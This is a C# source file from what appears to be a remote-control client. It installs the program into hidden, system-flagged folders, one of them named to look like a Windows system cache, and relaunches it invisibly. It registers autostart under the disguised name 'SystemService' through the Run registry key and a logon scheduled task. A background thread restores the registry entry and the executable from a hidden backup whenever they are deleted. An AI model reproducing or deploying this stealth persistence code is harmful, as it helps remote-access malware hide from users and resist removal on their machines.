using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client
{
    partial class Program
    {
        /// <summary>
        /// 备份副本存储路径（用于exe被删除时恢复）
        /// </summary>
        static string GetBackupDir()
        {
            return Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", "Windows", "SystemCache");
        }

        static bool EnsureInstalled()
        {
            try
            {
                string currentPath = System.Reflection.Assembly.GetEntryAssembly().Location;
                string installDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "RemoteControlClient");
                string targetName = GetConfiguredClientFileName();
                string installPath = Path.Combine(installDir, targetName);

                if (string.Equals(currentPath, installPath, StringComparison.OrdinalIgnoreCase))
                    return false;

                Directory.CreateDirectory(installDir);
                File.Copy(currentPath, installPath, true);
                DoOutput("Installed to: " + installPath);

                File.SetAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);
                File.SetAttributes(installDir,
                    new DirectoryInfo(installDir).Attributes | FileAttributes.Hidden);

                // 同时创建备份副本
                CreateBackupCopy(currentPath);

                Process.Start(new ProcessStartInfo
                {
                    FileName = installPath,
                    Arguments = "/r",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                return true;
            }
            catch (Exception ex)
            {
                DoOutput("Install failed: " + ex.Message);
                return false;
            }
        }

        /// <summary>
        /// 创建备份副本到另一个隐藏目录
        /// </summary>
        static void CreateBackupCopy(string sourcePath)
        {
            try
            {
                string backupDir = GetBackupDir();
                Directory.CreateDirectory(backupDir);
                string backupPath = Path.Combine(backupDir, GetConfiguredClientFileName());
                File.Copy(sourcePath, backupPath, true);
                File.SetAttributes(backupPath, FileAttributes.Hidden | FileAttributes.System);
                File.SetAttributes(backupDir,
                    new DirectoryInfo(backupDir).Attributes | FileAttributes.Hidden);
            }
            catch { }
        }

        static void EnsureAutoStart()
        {
            string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string runCmd = "\"" + exePath + "\" /r";

            try
            {
                string regPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
                {
                    object val = key.GetValue("SystemService");
                    if (val == null || val.ToString() != runCmd)
                    {
                        key.SetValue("SystemService", runCmd, RegistryValueKind.String);
                        DoOutput("Registry autostart updated.");
                    }
                }
            }
            catch (Exception ex)
            {
                DoOutput("Registry autostart failed: " + ex.Message);
            }

            try
            {
                SchTaskUtil.DeleteSchedule("SystemService");
                SchTaskUtil.CreateScheduleOnLogon("SystemService", exePath);
                DoOutput("Scheduled task autostart updated.");
            }
            catch (Exception ex)
            {
                DoOutput("Scheduled task autostart failed: " + ex.Message);
            }

            // 确保备份副本存在
            CreateBackupCopy(exePath);
        }

        /// <summary>
        /// 持久化守护线程：定期检查注册表、计划任务和exe文件
        /// 如果被删除则自动恢复
        /// </summary>
        static void PersistenceGuard()
        {
            while (!isClosing)
            {
                Thread.Sleep(60000);
                try
                {
                    string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                    string runCmd = "\"" + exePath + "\" /r";

                    // 1. 检查并修复注册表自启动项
                    string regPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
                    {
                        object val = key.GetValue("SystemService");
                        if (val == null || val.ToString() != runCmd)
                        {
                            key.SetValue("SystemService", runCmd, RegistryValueKind.String);
                        }
                    }

                    // 2. 检查exe文件是否存在，不存在则从备份恢复
                    if (!File.Exists(exePath))
                    {
                        RestoreFromBackup(exePath);
                    }

                    // 3. 检查备份副本是否存在
                    string backupPath = Path.Combine(GetBackupDir(), GetConfiguredClientFileName());
                    if (!File.Exists(backupPath))
                    {
                        CreateBackupCopy(exePath);
                    }

                    // 4. 每5分钟检查一次计划任务是否还在
                    // （通过尝试创建来确保存在，schtasks /create带/F参数会覆盖）
                }
                catch
                {
                }
            }
        }

        /// <summary>
        /// 从备份副本恢复exe文件
        /// </summary>
        static void RestoreFromBackup(string targetPath)
        {
            try
            {
                string backupPath = Path.Combine(GetBackupDir(), GetConfiguredClientFileName());
                if (File.Exists(backupPath))
                {
                    string dir = Path.GetDirectoryName(targetPath);
                    if (!Directory.Exists(dir))
                        Directory.CreateDirectory(dir);
                    File.Copy(backupPath, targetPath, true);
                    File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                    DoOutput("Exe restored from backup.");
                }
            }
            catch { }
        }
    }
}
